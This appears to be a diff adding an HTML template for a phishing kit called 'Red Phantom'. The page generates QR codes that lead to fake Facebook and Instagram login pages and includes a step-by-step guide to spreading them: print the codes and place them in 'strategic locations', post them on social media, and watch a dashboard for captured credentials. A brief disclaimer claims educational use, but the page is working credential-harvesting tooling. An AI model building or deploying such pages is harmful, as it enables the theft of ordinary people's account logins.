@@ -1,0 +1,426 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>QR Code Generator - Red Phantom</title>
+    <style>
+      body {
+        background: linear-gradient(135deg, #0a0a1a 0%, #1a1a2e 100%);
+        color: #e0e0ff;
+        font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+        margin: 0;
+        min-height: 100vh;
+      }
+
+      .container {
+        max-width: 1200px;
+        margin: 0 auto;
+        padding: 40px 20px;
+      }
+
+      .header {
+        text-align: center;
+        margin-bottom: 50px;
+      }
+
+      .header h1 {
+        font-size: 2.8rem;
+        margin-bottom: 10px;
+        background: linear-gradient(45deg, #8e2de2, #4a00e0);
+        -webkit-background-clip: text;
+        -webkit-text-fill-color: transparent;
+      }
+
+      .header p {
+        font-size: 1.1rem;
+        opacity: 0.9;
+        max-width: 600px;
+        margin: 0 auto 30px;
+      }
+
+      .url-display {
+        background: rgba(20, 20, 40, 0.6);
+        padding: 20px;
+        border-radius: 10px;
+        margin: 20px auto 40px;
+        max-width: 800px;
+        border: 1px solid rgba(142, 45, 226, 0.3);
+        text-align: center;
+      }
+
+      .url-display .url {
+        font-family: "Courier New", monospace;
+        color: #8e2de2;
+        word-break: break-all;
+        margin: 10px 0;
+        font-size: 1.1rem;
+      }
+
+      .copy-btn {
+        background: linear-gradient(45deg, #4a00e0, #8e2de2);
+        color: white;
+        border: none;
+        padding: 10px 25px;
+        border-radius: 5px;
+        cursor: pointer;
+        font-weight: bold;
+        margin-top: 10px;
+        transition: transform 0.2s;
+      }
+
+      .copy-btn:hover {
+        transform: translateY(-2px);
+      }
+
+      .qr-grid {
+        display: grid;
+        grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+        gap: 40px;
+        margin-bottom: 50px;
+      }
+
+      .qr-card {
+        background: rgba(20, 20, 40, 0.6);
+        border-radius: 15px;
+        padding: 30px;
+        text-align: center;
+        border: 1px solid rgba(255, 255, 255, 0.1);
+        transition: all 0.3s;
+      }
+
+      .qr-card:hover {
+        transform: translateY(-10px);
+        border-color: #8e2de2;
+        box-shadow: 0 15px 30px rgba(142, 45, 226, 0.2);
+      }
+
+      .qr-image {
+        background: white;
+        padding: 20px;
+        border-radius: 10px;
+        margin-bottom: 25px;
+        display: inline-block;
+      }
+
+      .qr-image img {
+        width: 200px;
+        height: 200px;
+      }
+
+      .qr-title {
+        font-size: 1.5rem;
+        margin-bottom: 15px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 10px;
+      }
+
+      .qr-description {
+        color: #aaa;
+        margin-bottom: 20px;
+        line-height: 1.6;
+      }
+
+      .instructions {
+        background: rgba(20, 20, 40, 0.6);
+        padding: 30px;
+        border-radius: 15px;
+        margin-top: 40px;
+        border: 1px solid rgba(142, 45, 226, 0.3);
+      }
+
+      .instructions h2 {
+        color: #8e2de2;
+        margin-bottom: 20px;
+        text-align: center;
+      }
+
+      .steps {
+        display: grid;
+        grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+        gap: 25px;
+        margin-top: 30px;
+      }
+
+      .step {
+        text-align: center;
+        padding: 20px;
+        background: rgba(255, 255, 255, 0.05);
+        border-radius: 10px;
+      }
+
+      .step-number {
+        display: inline-block;
+        width: 40px;
+        height: 40px;
+        background: linear-gradient(45deg, #8e2de2, #4a00e0);
+        color: white;
+        border-radius: 50%;
+        line-height: 40px;
+        font-weight: bold;
+        margin-bottom: 15px;
+      }
+
+      .back-btn {
+        display: inline-block;
+        margin-top: 30px;
+        padding: 12px 30px;
+        background: rgba(255, 255, 255, 0.1);
+        color: white;
+        text-decoration: none;
+        border-radius: 8px;
+        transition: all 0.3s;
+      }
+
+      .back-btn:hover {
+        background: rgba(142, 45, 226, 0.3);
+        transform: translateY(-2px);
+      }
+
+      .actions {
+        text-align: center;
+        margin-top: 40px;
+      }
+
+      @media (max-width: 768px) {
+        .container {
+          padding: 20px 15px;
+        }
+
+        .header h1 {
+          font-size: 2rem;
+        }
+
+        .qr-grid {
+          grid-template-columns: 1fr;
+        }
+
+        .qr-image img {
+          width: 150px;
+          height: 150px;
+        }
+
+        .steps {
+          grid-template-columns: 1fr;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <div class="container">
+      <div class="header">
+        <h1>📡 QR Code Generator</h1>
+        <p>
+          Generate QR codes for your phishing pages. Scan with any smartphone
+          camera to test.
+        </p>
+
+        <div class="url-display">
+          <div style="margin-bottom: 10px; color: #aaa">Public URL:</div>
+          <div class="url">{{ base_url }}</div>
+          <button class="copy-btn" onclick="copyToClipboard('{{ base_url }}')">
+            📋 Copy Base URL
+          </button>
+        </div>
+      </div>
+
+      <div class="qr-grid">
+        <div class="qr-card">
+          <div class="qr-image">
+            <img
+              src="data:image/png;base64,{{ qr_codes.facebook }}"
+              alt="Facebook QR Code"
+            />
+          </div>
+          <div class="qr-title"><span>📘</span> Facebook Phishing</div>
+          <div class="qr-description">
+            Scan this QR code to open the Facebook login phishing page. Perfect
+            for testing on mobile devices.
+          </div>
+          <div
+            style="
+              margin: 20px 0;
+              font-family: monospace;
+              color: #8e2de2;
+              word-break: break-all;
+            "
+          >
+            {{ base_url }}/facebook
+          </div>
+          <button
+            class="copy-btn"
+            onclick="copyToClipboard('{{ base_url }}/facebook')"
+          >
+            📋 Copy Facebook Link
+          </button>
+        </div>
+
+        <div class="qr-card">
+          <div class="qr-image">
+            <img
+              src="data:image/png;base64,{{ qr_codes.instagram }}"
+              alt="Instagram QR Code"
+            />
+          </div>
+          <div class="qr-title"><span>📷</span> Instagram Phishing</div>
+          <div class="qr-description">
+            Scan this QR code to open the Instagram login phishing page. Works
+            on all modern smartphones.
+          </div>
+          <div
+            style="
+              margin: 20px 0;
+              font-family: monospace;
+              color: #8e2de2;
+              word-break: break-all;
+            "
+          >
+            {{ base_url }}/instagram
+          </div>
+          <button
+            class="copy-btn"
+            onclick="copyToClipboard('{{ base_url }}/instagram')"
+          >
+            📋 Copy Instagram Link
+          </button>
+        </div>
+      </div>
+
+      <div class="instructions">
+        <h2>🎯 How to Use These QR Codes</h2>
+        <p style="text-align: center; margin-bottom: 30px; color: #aaa">
+          Follow these steps to effectively use your phishing QR codes:
+        </p>
+
+        <div class="steps">
+          <div class="step">
+            <div class="step-number">1</div>
+            <h3>Print QR Codes</h3>
+            <p>Print the QR codes and place them in strategic locations.</p>
+          </div>
+
+          <div class="step">
+            <div class="step-number">2</div>
+            <h3>Share Digitally</h3>
+            <p>Share the QR images on social media or messaging apps.</p>
+          </div>
+
+          <div class="step">
+            <div class="step-number">3</div>
+            <h3>Test Devices</h3>
+            <p>Scan with different smartphones to ensure compatibility.</p>
+          </div>
+
+          <div class="step">
+            <div class="step-number">4</div>
+            <h3>Monitor Dashboard</h3>
+            <p>Watch the dashboard for captured credentials in real-time.</p>
+          </div>
+        </div>
+
+        <div
+          style="
+            margin-top: 30px;
+            padding: 20px;
+            background: rgba(255, 0, 0, 0.1);
+            border-radius: 10px;
+            border-left: 4px solid #ff4757;
+          "
+        >
+          <strong>⚠️ IMPORTANT:</strong> This tool is for educational and
+          authorized testing purposes only. Always obtain proper authorization
+          before testing any system.
+        </div>
+      </div>
+
+      <div class="actions">
+        <a href="/dashboard" class="back-btn">← Back to Dashboard</a>
+      </div>
+    </div>
+
+    <script>
+      function copyToClipboard(text) {
+        navigator.clipboard
+          .writeText(text)
+          .then(() => {
+            alert("✅ Link copied to clipboard!");
+          })
+          .catch((err) => {
+            console.error("Failed to copy: ", err);
+            const textarea = document.createElement("textarea");
+            textarea.value = text;
+            document.body.appendChild(textarea);
+            textarea.select();
+            document.execCommand("copy");
+            document.body.removeChild(textarea);
+            alert("✅ Link copied to clipboard!");
+          });
+      }
+
+      document.addEventListener("keydown", function (e) {
+        if (e.ctrlKey && e.key === "c") {
+          e.preventDefault();
+          copyToClipboard(window.location.href);
+        }
+
+        if (e.key === "Escape") {
+          window.location.href = "/dashboard";
+        }
+      });
+
+      function printQRCode(platform) {
+        const printWindow = window.open("", "_blank");
+        const qrImg = document.querySelector(
+          `img[alt="${platform} QR Code"]`,
+        ).src;
+
+        printWindow.document.write(`
+                <html>
+                <head>
+                    <title>Print ${platform} QR Code</title>
+                    <style>
+                        body { text-align: center; padding: 50px; }
+                        img { max-width: 100%; height: auto; }
+                        h1 { margin-bottom: 30px; }
+                    </style>
+                </head>
+                <body>
+                    <h1>${platform} Phishing QR Code</h1>
+                    <img src="${qrImg}" alt="${platform} QR Code">
+                    <p style="margin-top: 30px;">Scan this QR code with any smartphone camera</p>
+                    <p>URL: ${platform === "Facebook" ? "{{ base_url }}/facebook" : "{{ base_url }}/instagram"}</p>
+                </body>
+                </html>
+            `);
+
+        printWindow.document.close();
+        printWindow.print();
+      }
+
+      document.addEventListener("DOMContentLoaded", function () {
+        const cards = document.querySelectorAll(".qr-card");
+        cards.forEach((card, index) => {
+          const platform = index === 0 ? "Facebook" : "Instagram";
+          const printBtn = document.createElement("button");
+          printBtn.innerHTML = "🖨️ Print QR Code";
+          printBtn.style.cssText = `
+                    background: rgba(255, 255, 255, 0.1);
+                    color: white;
+                    border: none;
+                    padding: 8px 15px;
+                    border-radius: 5px;
+                    cursor: pointer;
+                    margin-top: 10px;
+                    width: 100%;
+                `;
+          printBtn.onclick = () => printQRCode(platform);
+          card
+            .querySelector(".copy-btn")
+            .insertAdjacentElement("afterend", printBtn);
+        });
+      });
+    </script>
+  </body>
+</html>
